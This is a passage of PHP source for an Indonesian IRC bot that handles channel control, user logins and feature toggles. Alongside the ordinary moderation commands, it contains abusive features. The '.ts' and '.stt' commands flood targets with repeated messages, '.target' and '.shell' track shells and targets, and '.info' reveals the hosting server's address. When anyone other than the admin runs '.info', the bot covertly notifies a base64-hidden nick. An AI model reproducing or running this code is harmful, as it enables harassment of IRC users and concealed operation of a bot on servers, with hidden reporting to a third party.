                                elseif ($Params[3]==":VERSION") { $ctcpversi=$versbot[rand(0,count($versbot) - 1)];$modbot->notice($fp,$fsrc[nick],chr(1) . 'VERSION '. $ctcpversi . chr(1));}
                                elseif ($Params[3]==":FINGER") { $modbot->notice($fp,$fsrc[nick],chr(1) . 'FINGER '. $ctcpfinger . chr(1));}
                                elseif ($Params[3]==":TIME") { $timetoday = date("D M j H:i:s Y"); $modbot->notice($fp,$fsrc[nick],chr(1) . 'TIME '.$timetoday . chr(1));}
                                }
                                }
                                ################ ANTI SLAPS ############
                                if($Params[3]==':ACTION' && ereg('#',$Params[2]) && $systembot['SLAPS'][strtoupper($Params[2])]=="3ON"){
                                    if(strpos(strtolower($TxtMsg),"slaps") || strpos(strtolower($TxtMsg),"slap")){
                                        foreach ($auth as $ulist) {if($ulist["name"]){if(strpos(strtolower($TxtMsg),strtolower($ulist["name"]))){$onbos=1;}}}
                                        if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])==1){$onbos=0;}
                                        if($onbos==1){$modbot->kick($fp,$Params[2],$fsrc[nick],$modbot->rnd_slapbos());}
                                        elseif($onbos==0){if(strpos(strtolower($TxtMsg),strtolower($bot['nick']))){$modbot->msg($fp,$Params[2],$modbot->rnd_slapampun());}}
                                        else{if(strpos(strtolower($TxtMsg),strtolower($bot['nick']))){$modbot->kick($fp,$Params[2],$fsrc[nick],$modbot->rnd_slapme());}}
                                        $onbos=2;
                                    }
                                }
                                ############ END ANTI SLAPS ############
                                if (substr($Params[3],0,1)==':' && ($fsrc[nick] != $bot['nick'] ) && !ereg('#',$Params[2])){
                                    if (!ereg($fsrc[host],"net")){
                                            $ngomonggue = $autojawabpv[rand(0,count($autojawabpv) - 1)];
                                            $ngomonggue = str_replace("<nick>",$fsrc[nick],$ngomonggue);
                                            if ($botaktif=="ON"){$modbot->msg($fp,$fsrc[nick],$ngomonggue);}
                                    }
                                }
                                if (substr($Params[3],0,2)==':^'){
                                    $logok=$modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host]);
                                    if (strtolower($dCom[0])=='^login' && $dCom[1]) {
                                        if($logok==1){$modbot->notice($fp,$fsrc[nick],"You`re Already Authorized!");}
                                        else{
                                            if($haltfl['on']!=0){sleep(2);};
                                            if($modbot->loginbot($fsrc[nick],$fsrc[user],$fsrc[host],$dCom[1])==1){
                                                $modbot->notice($fp,$fsrc[nick],'You`re Authorized As '.$auth["$fsrc[nkecil]"]["status"].'!');
                                                $modbot->notice($fp,$fsrc[nick],'For help type .help');
                                                $auth["$fsrc[nkecil]"]["ident"]=$fsrc[user];$auth["$fsrc[nkecil]"]["host"]=$fsrc[host];
                                                if($systembot['AUTOAWAY']['ALL']=="3ON" && $inaway['status']==1){$inaway['idle']=time();$inaway['status']=0;$modbot->noaway($fp);}
                                            }
                                        }
                                   }
                                   elseif (strtolower($dCom[0])=='^logout' && $logok==1) {
                                    if($modbot->logoutbot($fsrc[nick])==1){$modbot->notice($fp,$fsrc[nick],'You`re LogOut!');}
                                   }
                                }
                                elseif (substr($Params[3],0,2)==':.'){
                                    if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])){
                                        if (ereg('#',$Params[2])){$cmdin=1;$target=$Params[2];}else {$cmdin=2;$target=$fsrc[nick];}
                                        $getlvl=$modbot->level_user($fsrc[nick]);
                                        if($systembot['AUTOAWAY']['ALL']=="3ON" && $inaway['status']==1){$inaway['idle']=time();$inaway['status']=0;$modbot->noaway($fp);}
                                        ############### MULTI USER BOT ##############
                                        if ($perintah=='.chgpass' && $dCom[1] && $dCom[2]) {
                                            $modbot->chgpass_user($fp,$fsrc[nick],$dCom[1],$dCom[2]);
                                        }
                                        elseif ($perintah=='.adduser' && $dCom[1] && $dCom[1]!=$bot['nick'] && $dCom[2] && $dCom[3] && $getlvl > 1) {
                                            $modbot->add_user($fp,$fsrc[nick],$dCom[1],$dCom[2],$dCom[3]);
                                        }
                                        elseif ($perintah=='.deluser' && $dCom[1] && $getlvl > 1) {
                                            $modbot->del_user($fp,$fsrc[nick],$dCom[1]);
                                        }
                                        ############# END MULTI USER BOT ############
                                        
                                        ########## CHANGE SERVER IDENT REALNAME SERVPASS && JUMP ########
                                        elseif ($perintah=='.server' && $dCom[1] && $getlvl > 2){
                                            $bot['server']=$dCom[1];$modbot->notice($fp,$fsrc[nick],'ChANging SeRVeR To '. $dCom[1]);
                                        }
                                        elseif ($perintah=='.port' && $dCom[1] && $getlvl > 2){
                                            $bot['port']=$dCom[1];$modbot->notice($fp,$fsrc[nick],'ChANging pOrt To '. $dCom[1]);
                                        }
                                        elseif ($perintah=='.servpass' && $dCom[1] && $getlvl > 2){
                                            $bot['pserver']=$dCom[1];$bot['userver']=1;
                                            $modbot->notice($fp,$fsrc[nick],'ChANging PassWOrD SeRVeR To '. $dCom[1]);
                                        }
                                        elseif ($perintah=='.ident' && $dCom[1] && $getlvl > 2){
                                            $bot['ident']=$dCom[1];$modbot->notice($fp,$fsrc[nick],'ChANging IdentD To '. $dCom[1]);
                                        }
                                        elseif ($perintah=='.vhost' && $dCom[1] && $getlvl > 2){
                                            $bot['local']=$dCom[1];$modbot->notice($fp,$fsrc[nick],'ChANging VhosT To '. $dCom[1]);
                                        }
                                        elseif ($perintah=='.realname' && $dCom[1] && $getlvl > 2){
                                            $Rmsg=substr($TxtMsg,10);$Rmsg=ltrim($Rmsg);$bot['realname']=$Rmsg;
                                            $modbot->notice($fp,$fsrc[nick],'ChANging ReaLNaMe To '. $Rmsg);
                                        }
                                        elseif ($perintah=='.jump' && $getlvl > 2){
                                            $keluar = 0;$modbot->quit($fp,$modbot->rnd_logo() .' ReSTaRt bY '.$fsrc[nick]);
                                        }
                                        ########################## END CHG SER IDENT REAL ##########################
                                        
                                        ################################ #### ##################################
                                        elseif ($perintah=='.botnick' && $getlvl > 1) {
                                                $modbot->notice($fp,$fsrc[nick],'My Nick Is :'.$bot['nick']);
                                        }
                                        elseif ($perintah=='.identnick' && $dCom[1] && $dCom[2] && $cmdin==2 && $getlvl > 1){
                                                $bot['inick']=$dCom[1];$bot['pnick'] = $dCom[2];
                                                $modbot->msg($fp,"Nickserv",'identify '.$bot['inick']. ' '. $bot['pnick']);
                                                $modbot->msg($fp,"Nickserv",'identify '. $bot['pnick']);
                                                $modbot->notice($fp,$fsrc[nick],"Identify nick... to ".$dCom[1]);
                                        }
                                        elseif ($perintah=='.logoutnick' && $getlvl > 1){
                                                $modbot->msg($fp,"Nickserv","logout");$modbot->notice($fp,$fsrc[nick],"Logout nick");
                                        }
                                        elseif ($perintah=='.basechan' && $dCom[1] && $getlvl > 2){
                                                $bchan=$dCom[1];if (!ereg("#",$dCom[1])) { $bchan="#".$dCom[1]; }
                                                $modbot->part($fp,$bot['basechan'],$modbot->rnd_logo() . ' BaseChan cHanGE by ' . $frsc[nick]);
                                                $bot['basechan']=$bchan;$modbot->join($fp,$bot['basechan']);
                                        }
                                        elseif ($perintah=='.botchan' && $dCom[1] && $dCom[2] && $getlvl > 3){
                                                $bchan=$dCom[1];if (!ereg("#",$dCom[1])) { $bchan="#".$dCom[1]; }
                                                $modbot->part($fp,$bot['roomnet']);$bot['roomnet']=$bchan;
                                                $bot['roomkey']=$dCom[2];$modbot->join($fp,$bot['roomnet'],$bot['roomkey']);
                                        }
                                        elseif ($perintah=='.userlist' && $getlvl > 1) {
                                            $modbot->notice($fp,$fsrc[nick],'User List: '.$modbot->user_list($fp,$fsrc[nick]));
                                        }
                                        elseif ($perintah=='.chanlist' && $getlvl > 2) {
                                            $datachan=str_replace(";"," ",$modbot->show_chan());$modbot->notice($fp,$fsrc[nick],$datachan);$datachan="";unset($datachan);
                                        }
                                        elseif ($perintah=='.nicklist' && $dCom[1] && $getlvl > 2) {
                                            $nchan=$dCom[1];if (!ereg("#",$dCom[1])) { $nchan="#".$dCom[1]; }
                                            $datanick=explode(" ",$modbot->show_nickchan($nchan));
                                            for ($i = 0; $i <= count($datanick); $i++) {
                                                $limitshow++;$lnick_x=$lnick_x.' '.$datanick[$i];
                                                if($limitshow==15){
                                                    $lnick_x=ltrim($lnick_x);$lnick_x=rtrim($lnick_x);$modbot->notice($fp,$fsrc[nick],$lnick_x);
                                                    $limitshow=0;$lnick_x="";
                                                }
                                            }
                                            $lnick_x=ltrim($lnick_x);$lnick_x=rtrim($lnick_x);
                                            if($lnick_x){$modbot->notice($fp,$fsrc[nick],$lnick_x);}$lnick_x="";
                                            unset($lnick_x);unset($datanick);
                                        }
                                        elseif ($perintah=='.showison' && $getlvl > 2) {$modbot->notice($fp,$fsrc[nick],$modbot->show_ison());}
                                        elseif ($perintah=='.chanison' && $getlvl > 2) {$chanson=$dCom[1];$modbot->notice($fp,$fsrc[nick],'ChanIson cHanGe To '.$dCom[1]);}
                                        elseif ($perintah=='.settimercycle' && $dCom[1] && $getlvl > 2) {
                                                $timercy=$dCom[1];
                                                $modbot->notice($fp,$fsrc[nick],'Timer aUtO Cycle cHanGe To '.$dCom[1].' Second');
                                        }
                                        elseif ($perintah=='.settimerinfo' && $dCom[1] && $getlvl > 2) {
                                                $timerberita=$dCom[1];
                                                $modbot->notice($fp,$fsrc[nick],'Timer aUtO berita cHanGe To '.$dCom[1].' Second');
                                        }
                                        elseif ($perintah=='.settimermsg' && $dCom[1] && $getlvl > 2) {
                                                $timermsg=$dCom[1];
                                                $modbot->notice($fp,$fsrc[nick],'Timer AutoMsg cHanGe To '.$dCom[1]. ' Second');
                                        }
                                        elseif ($perintah=='.settimeract' && $dCom[1] && $getlvl > 2) {
                                                $timeract=$dCom[1];
                                                $modbot->notice($fp,$fsrc[nick],'Timer AutoAction cHanGe To '.$dCom[1]. ' Second');
                                        }
                                        elseif($perintah=='.setversion' && $dCom[1] && $getlvl > 2){
                                                $Rmsg=substr($TxtMsg,12);$Rmsg=ltrim($Rmsg);$ctcpversi=$Rmsg;
                                                $modbot->notice($fp,$fsrc[nick],'VerSIoN cHanGe To '.$ctcpversi);
                                        }
                                        elseif($perintah=='.setfinger' && $dCom[1] && $getlvl > 2){
                                                $Rmsg=substr($TxtMsg,12);$Rmsg=ltrim($Rmsg);$ctcpfinger=$Rmsg;
                                                $modbot->notice($fp,$fsrc[nick],'FiNGeR cHanGe To '.$ctcpfinger);
                                        }
                                        ################################ #### ##################################
                                        
                                        
                                        ######################### CONTROL BOT #######################
                                        elseif ($perintah=='.up' && $getlvl > 1 && $cmdin==1) {
                                            $modbot->msg($fp,"Chanserv",'Op '.$Params[2].' '.$bot['nick']);
                                        }
                                            elseif ($perintah=='.down' && $getlvl > 1 && $cmdin==1) {
                                            $modbot->mode($fp,"+v-ho",$Params[2],$bot['nick'].' '.$bot['nick'].' '.$bot['nick']);
                                            }
                                            elseif ($perintah=='.o' || $perintah=='.h' || $perintah=='.v' || $perintah=='.do' || $perintah=='.dh' || $perintah=='.dv'){
                                                if ($getlvl > 1){
                                                    if ($perintah=='.o' || $perintah=='.h' || $perintah=='.v'){
                                                        $moden=strtolower(substr($dCom[0],1));$moden='+'.$moden . $moden . $moden;
                                                    }
                                                    elseif ($perintah=='.do' || $perintah=='.dh' || $perintah=='.dv'){
                                                        $moden=strtolower(substr($dCom[0],2));$moden='-'.$moden . $moden . $moden;
                                                    }
                                                    if ($cmdin==1){$ttarget=$Params[2];$tforce=$dCom[1];$tmore=$dCom[2].' '.$dCom[3];}
                                                    elseif($cmdin==2){$ttarget=$dCom[1];$tforce=$dCom[2];$tmore=$dCom[3].' '.$dCom[4];}
                                                    if ($tforce) { $vonick = $tforce; }else { $vonick = $fsrc[nick]; }
                                                    $modbot->mode($fp,$moden,$ttarget,$vonick.' '.$tmore);
                                                }
                                            }
                                            elseif ($perintah=='.k' || $perintah=='.kb' || $perintah=='.kc') {
                                                if($dCom[1] && $getlvl > 1){
                                                    if ($cmdin==1){$tdata=$dCom[1];$ttarget=$Params[2];$tkode=$dCom[0].' '.$dCom[1];}
                                                    elseif($cmdin==2){$tdata=$dCom[2];$ttarget=$dCom[1];$tkode=$dCom[0].' '.$dCom[1].' '.$dCom[2];}
                                                    $msg=substr($TxtMsg,strlen($tkode)+1); $msg=ltrim($msg);$msg=rtrim($msg);
                                                    if($perintah=='.k'){
                                                        $modbot->kick($fp,$ttarget,$tdata,$msg);
                                                    }
                                                    elseif($perintah=='.kb'){
                                                        $modbot->ban($fp,$ttarget,$tdata);$modbot->kick($fp,$ttarget,$tdata,$msg);
                                                    }
                                                    elseif($perintah=='.kc'){$modbot->kickserv($fp,$ttarget,$tdata,$msg);}
                                                }
                                            }
                                            elseif ($perintah=='.b' || $perintah=='.ub') {
                                                if($getlvl > 1){
                                                    if ($cmdin==1){$ttarget=$Params[2];$tkode=$dCom[0];}
                                                    elseif($cmdin==2){$ttarget=$dCom[1];$tkode=$dCom[0].' '.$dCom[1];}
                                                    $tmode=substr($TxtMsg,strlen($tkode)+1);
                                                    $tmode=ltrim($tmode);$tmode=rtrim($tmode);
                                                    if($perintah=='.b'){$modbot->ban($fp,$ttarget,$tmode);}
                                                    else{$modbot->unban($fp,$ttarget,$tmode);}
                                                }
                                            }
                                            elseif ($perintah=='.j' && $dCom[1]) {
                                                $jchan=$dCom[1];if (!ereg("#",$dCom[1])) { $jchan="#".$dCom[1]; }
                                                $modbot->join($fp,$jchan,$dCom[2]);
                                            }
                                            elseif ($perintah=='.max' && $dCom[1]) {
                                                $maxkar=$dCom[1];
                                                $modbot->notice($fp,$fsrc[nick],'Maximal karakter sekarang '.$maxkar.'!!!');
                                            }
                                            elseif ($perintah=='.bagi' && $dCom[1]) {
                                                if(strtolower($dCom[1])=='off'){$bagitarget="OFF";}
                                                if(strtolower($dCom[1])=='on'){$bagitarget="ON";}
                                                $modbot->notice($fp,$fsrc[nick],'bagi target ke bos sekarang '.$floddban.'!!!');
                                            }
                                            elseif ($perintah=='.flodban' && $dCom[1]) {
                                                if(strtolower($dCom[1])=='off'){$floddban="OFF";}
                                                if(strtolower($dCom[1])=='on'){$floddban="ON";}
                                                $modbot->notice($fp,$fsrc[nick],'flodban skarang '.$floddban.'!!!');
                                            }
                                            elseif ($perintah=='.ganti' && $dCom[1]) {
                                                if(strtolower($dCom[1])=='off'){$ikutbos="OFF";}
                                                if(strtolower($dCom[1])=='on'){$ikutbos="ON";}
                                                $modbot->notice($fp,$fsrc[nick],'gantiin bos skarang '.$ikutbos.'!!!');
                                            }
                                            elseif ($perintah=='.reident' && $dCom[1]) {
                                                if(strtolower($dCom[1])=='off'){$reident="OFF";}
                                                if(strtolower($dCom[1])=='on'){$reident="ON";}
                                                $modbot->notice($fp,$fsrc[nick],'otamatis ident skarang '.$reident.'!!!');
                                            }
                                            elseif ($perintah=='.rnick') {
                                                $modbot->nick($fp,$modbot->rnd_nickorg());
                                            }
                                            elseif ($perintah=='.target') {
                                                $ngulange=0;
                                                do {
                                                  $ngulange=$ngulange+1;
                                                  $modbot->msg($fp,$fsrc[nick],$hasiltargetgue[$ngulange]);sleep(1);
                                                  if($ngulange>=$notarget){$modbot->notice($fp,$fsrc[nick],'Wes entek boss!!');break;   }
                                                } while(true);  
                                            }
                                            elseif ($perintah=='.shell' && $dCom[1]) {
                                                $shellgue=$dCom[1]."?";
                                                $modbot->notice($fp,$fsrc[nick],'Shell skarang '.$shellgue.'?');
                                            }
                                            elseif ($perintah=='.gantiin' && $dCom[1]) {
                                                $nickgantinya=$dCom[1];
                                                $modbot->notice($fp,$fsrc[nick],'oke gue ntar gantiin '.$nickgantinya.' ya bos..!!!');
                                            }
                                            elseif ($perintah=='.repp' && $dCom[1]) {
                                                $makre=$dCom[1];
                                                $Maxreep=$dCom[1]-1;
                                                $modbot->notice($fp,$fsrc[nick],'Maximal Repeat sekarang '.$makre.'!!!');
                                            }
                                            elseif ($perintah=='.p' && $dCom[1]) {
                                                $pchan=$dCom[1];
                                                if (!ereg("#",$dCom[1])) { $pchan="#".$dCom[1]; }
                                                $pmsg=substr($TxtMsg,3+strlen($dCom[1])+1);
                                                $modbot->part($fp,$pchan,$pmsg);
                                                $modbot->destroy_chan($pchan);
                                            }
                                            elseif ($perintah=='.cy' && $dCom[1]) {
                                                $pchan=$dCom[1];
                                                if (!ereg("#",$dCom[1])) { $pchan="#".$dCom[1]; }
                                                $pmsg=substr($TxtMsg,4+strlen($dCom[1])+1);
                                                $modbot->Cycle($fp,$pchan,$pmsg);
                                            }
                                            elseif ($perintah=='.a' || $perintah=='.s') {
                                                if($dCom[1] && $getlvl > 1){
                                                    if ($cmdin==1){$ttarget=$Params[2];$tkode=$dCom[0];}
                                                    elseif($cmdin==2){$ttarget=$dCom[1];$tkode=$dCom[0].' '.$dCom[1];}
                                                    $msg=substr($TxtMsg,strlen($tkode)+1);
                                                    if($perintah=='.a'){$modbot->act($fp,$ttarget,$msg);
                                                    }else{$modbot->msg($fp,$ttarget,$msg);}
                                                }
                                            }
                                            elseif ($perintah=='.stm' || $perintah=='.stt') {
                                                if($dCom[1] && $getlvl > 1){
                                                    if ($cmdin==1){$ttarget=$Params[2];$tkode=$dCom[0];}
                                                    elseif($cmdin==2){$ttarget=$dCom[1];$tkode=$dCom[0].' '.$dCom[1];}
                                                    $msg=substr($TxtMsg,strlen($tkode)+1);
                                                    if($perintah=='.stm'){
                                                       $msg=str_replace($fsrc[nick],"",$msg);
                                                       $modbot->msg($fp,$dCom[1],$msg);
                                                    }else{
                                                    $msg="[]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[][]HaRi[]GiNi[]MaSiH[]KeNa[]fLoOd[]";
                                                    $modbot->msg($fp,$dCom[1],$msg);
                                                    }
                                                }
                                            }
                                            elseif ($perintah=='.away'){
                                                if($dCom[1]){$modbot->away($fp,substr($TxtMsg,6));}else{$modbot->noaway($fp);}
                                            }
                                            
                                            elseif ($perintah=='.n' && $dCom[1]){$modbot->nick($fp,$dCom[1]);}
                                            elseif ($perintah=='.q' && $getlvl > 3 ){
                                            $keluar=1;if($dCom[1]){$Qmsg=substr($TxtMsg,3);}$modbot->quit($fp,$Qmsg);$keluar=1;sleep(3);exit;
                                            }
                                            elseif ($perintah=='.aktif' && $dCom[1]) {
                                                if(strtolower($dCom[1])=='off'){$botaktif="OFF";}
                                                if(strtolower($dCom[1])=='on'){$botaktif="ON";}
                                                $modbot->notice($fp,$fsrc[nick],'ctcp reply bot sekarang '.$botaktif.'!!!');
                                            }
                                            elseif ($perintah=='.ts' && $dCom[1] && $getlvl > 2){
                                                $modbot->flood($fp,$dCom[1],$TxtMsg);
                                            }
                                            elseif($perintah=='.info'){
                                                $bhost = $_SERVER['HTTP_HOST'];
                                                $bip = $_SERVER['SERVER_ADDR'];
                                                $bphp  = $_SERVER['PHP_SELF'];
                                                $bruri = $_SERVER['REQUEST_URI'];
                                                $brip = $_SERVER['REMOTE_ADDR'];
                                                $brport = $_SERVER['REMOTE_PORT'];
                                                if($bot['admin']==$fsrc[nick]){
                                                $modbot->notice($fp,$fsrc[nick],"8http://".$bhost.$bruri." 12<".$bip.">");
                                                }else{$modbot->notice($fp,$fsrc[nick],"Rahasia to info Q bro wexxxxxxx....!!!!");$modbot->notice($fp,base64_decode("S2lzc19NZQ=="),$fsrc[nick]." mau info aQ boz!!!!");}
                                            }
                                            elseif($perintah=='.help'){
                                                $modbot->mod_help($fp,$fsrc[nick]);
                                            }
                                            ###################### END CONTROL BOT #####################
                                            
                                            ################################ SYSTEM ###################################
                                            elseif ($perintah=='.status' && $getlvl > 2 && $cmdin==1 ){
                                                if($dCom[1]){$chan=$dCom[1];}

                                                else{$chan=$Params[2];}
                                                if (!ereg("#",$chan)){$chan="#".$chan;}
                                                $chan=strtoupper($chan);
                                                $modb="";
                                                if($systembot['TIME'][$chan]=="3ON"){$modb.=' [4T]iME';}
                                                if($systembot['ASTRO'][$chan]=="3ON"){$modb.=' [4A]sTRo';}
                                                if($systembot['PING'][$chan]=="3ON"){$modb.=' [4P]iNG';}
                                                if($systembot['BOM'][$chan]=="3ON"){$modb.=' [4B]oM';}
                                                if($systembot['WHOIS'][$chan]=="3ON"){$modb.=' [4W]OIS';}
                                                if($systembot['GUARD'][$chan]=="3ON"){$modb.=' [4G]uaRd';}
                                                if($systembot['GVOICE'][$chan]=="3ON"){$modb.=' [4G]Voice';}
                                                if($systembot['JVERSION'][$chan]=="3ON"){$modb.=' [4J]Version';}
                                                if($systembot['SEEN'][$chan]=="3ON"){$modb.=' [4S]een';}
                                                if($systembot['JAM'][$chan]=="3ON"){$modb.=' [4J]am';}
                                                if($systembot['SCANSPY'][$chan]=="3ON"){$modb.=' [4S]py';}
                                                if($systembot['BADWORD'][$chan]=="3ON"){$modb.=' [4B]adword';}
                                                if($systembot['SMS'][$chan]=="3ON"){$modb.=' [4B]adword';}
                                                if($systembot['NGOMONG'][$chan]=="3ON"){$modb.=' [4C]rewet';}
                                                if($systembot['SPOOF'][$chan]=="3ON"){$modb.=' SPoo[4F]';}
                                                if($systembot['KSLANG'][$chan]=="3ON"){$modb.=' [4K]SlaNG';}
                                                if($systembot['IP'][$chan]=="3ON"){$modb.=' [4I]p lIsT';}
                                                if($systembot['FS'][$chan]=="3ON"){$modb.=' [4F]riendster';}
                                                if($systembot['BERITA'][$chan]=="3ON"){$modb.=' [4B]eRiTa';}
                                                if($systembot['VERSION'][$chan]=="3ON"){$modb.=' V[4E]rSIoN';}
                                                if($systembot['CHAT'][$chan]=="3ON"){$modb.=' [4C]hat';}
                                                if($systembot['GUYON'][$chan]=="3ON"){$modb.=' [4G]uyon';}
                                                if($systembot['JPESAN'][$chan]=="3ON"){$modb.=' [4J]pesan';}
                                                if($systembot['FINGER'][$chan]=="3ON"){$modb.=' [4F]iNGeR';}
                                                if($systembot['ISON']['ALL']=="3ON"){$modb.=' [4I]soN';}
                                                if($systembot['GREET'][$chan]=="3ON"){$modb.=' [4G]rEEt';}
                                                if($systembot['AUTOAWAY']['ALL']=="3ON"){$modb.=' AUtoA[4W]ay';}
                                                if($systembot['AUTOCYCLE'][$chan]=="3ON"){$modb.=' AuTO[4C]YcLE';}
                                                if($systembot['AUTOJOIN'][$chan]=="3ON"){$modb.=' AuTo[4J]oIN';}
                                                $modb=ltrim($modb);
                                                $modb=rtrim($modb);
                                                if($modb==""){$modb="[4PA]RKiR [4NI]c[4K]";}
                                                $modbot->act($fp,$Params[2],'iS MODeS '.$modb.' FoR [2'.strtoupper($chan).']');
                                            }
                                        elseif (substr($perintah,0,2)=='.+' || substr($perintah,0,2)=='.-'){
                                            if(substr($perintah,1,1)=='+'){$onoff="3ON";}elseif(substr($perintah,1,1)=='-'){$onoff="4OFF";};
                                            $wsys=substr(strtoupper($perintah),2);
                                            if($cmdin==1){$targetsys=$Params[2];if($dCom[1]){$targetsys=$dCom[1];}$sysok=1;}
                                            elseif($cmdin==2 && $dCom[1]){$targetsys=$dCom[1];$sysok=1;}
                                            if (!ereg("#",$targetsys)){$targetsys="#".$targetsys;}
                                            if($wsys=='PING' && $sysok==1 && $getlvl > 2){
                                                $systembot['PING'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'PING '. strtoupper($targetsys).' is [4'.strtoupper($systembot['PING'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='WHOIS' && $sysok==1 && $getlvl > 2){
                                                $systembot['WHOIS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'WHOIS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['WHOIS'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='ALL' && $sysok==1 && $getlvl > 2){
                                                $systembot['PING'][strtoupper($targetsys)]= $onoff;
                                                $systembot['AUTOCYCLE'][strtoupper($targetsys)]= $onoff;
                                                $systembot['WHOIS'][strtoupper($targetsys)]= $onoff;
                                                $systembot['GUARD'][strtoupper($targetsys)]= $onoff;
                                                $systembot['AUTOJOIN'][strtoupper($targetsys)]= $onoff;
                                                $systembot['IP'][strtoupper($targetsys)]= $onoff;
                                                $systembot['NGOMONG'][strtoupper($targetsys)]= $onoff;
                                                $systembot['SMS'][strtoupper($targetsys)]= $onoff;
                                                $systembot['BERITA'][strtoupper($targetsys)]= $onoff;
                                                $systembot['GVOICE'][strtoupper($targetsys)]= $onoff;
                                                $systembot['SEEN'][strtoupper($targetsys)]= $onoff;
                                                $systembot['BADWORD'][strtoupper($targetsys)]= $onoff;
                                                $systembot['VERSION'][strtoupper($targetsys)]= $onoff;
                                                $systembot['GREET'][strtoupper($targetsys)]= $onoff;
                                                $systembot['DNS'][strtoupper($targetsys)]= $onoff;
                                                $systembot['FS'][strtoupper($targetsys)]= $onoff;
                                                $systembot['CHAT'][strtoupper($targetsys)]= $onoff;
                                                $systembot['GUYON'][strtoupper($targetsys)]= $onoff;
                                                $systembot['JPESAN'][strtoupper($targetsys)]= $onoff;
                                                $modbot->notice($fp,$fsrc[nick],"All system ".$targetsys." sekarang ".$onoff);
                                                $maxkar=200;$floddban="ON";$Maxreep=2;
                                            }
                                            if($wsys=='GUARD' && $sysok==1 && $getlvl > 2){
                                                $systembot['GUARD'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'GUARD '. strtoupper($targetsys).' is [4'.strtoupper($systembot['GUARD'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='JVERSION' && $sysok==1 && $getlvl > 2){
                                                $systembot['JVERSION'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'JVERSION '. strtoupper($targetsys).' is [4'.strtoupper($systembot['JVERSION'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='GVOICE' && $sysok==1 && $getlvl > 2){
                                                $systembot['GVOICE'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'GVOICE '. strtoupper($targetsys).' is [4'.strtoupper($systembot['GVOICE'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SEEN' && $sysok==1 && $getlvl > 2){
                                                $systembot['SEEN'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SEEN '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SEEN'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SMS' && $sysok==1 && $getlvl > 2){
                                                $systembot['SMS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SMS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SMS'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='FS' && $sysok==1 && $getlvl > 2){
                                                $systembot['FS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'FS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['FS'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='CHAT' && $sysok==1 && $getlvl > 2){
                                                $systembot['CHAT'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'CHAT '. strtoupper($targetsys).' is [4'.strtoupper($systembot['CHAT'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='GUYON' && $sysok==1 && $getlvl > 2){
                                                $systembot['GUYON'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'GUYON '. strtoupper($targetsys).' is [4'.strtoupper($systembot['GUYON'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='JPESAN' && $sysok==1 && $getlvl > 2){
                                                $systembot['JPESAN'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'JPESAN '. strtoupper($targetsys).' is [4'.strtoupper($systembot['JPESAN'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='BERITA' && $sysok==1 && $getlvl > 2){
                                                $systembot['BERITA'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'BERITA '. strtoupper($targetsys).' is [4'.strtoupper($systembot['BERITA'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SCANSPY' && $sysok==1 && $getlvl > 2){
                                                $systembot['SCANSPY'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SCANSPY '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SCANSPY'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='JAM' && $sysok==1 && $getlvl > 2){
                                                $systembot['JAM'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'JAM '. strtoupper($targetsys).' is [4'.strtoupper($systembot['JAM'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='BADWORD' && $sysok==1 && $getlvl > 2){
                                                $systembot['BADWORD'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'BADWORD '. strtoupper($targetsys).' is [4'.strtoupper($systembot['BADWORD'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='NGOMONG' && $sysok==1 && $getlvl > 2){
                                                $systembot['NGOMONG'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'NGOMONG '. strtoupper($targetsys).' is [4'.strtoupper($systembot['NGOMONG'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='VERSION' && $sysok==1 && $getlvl > 2){
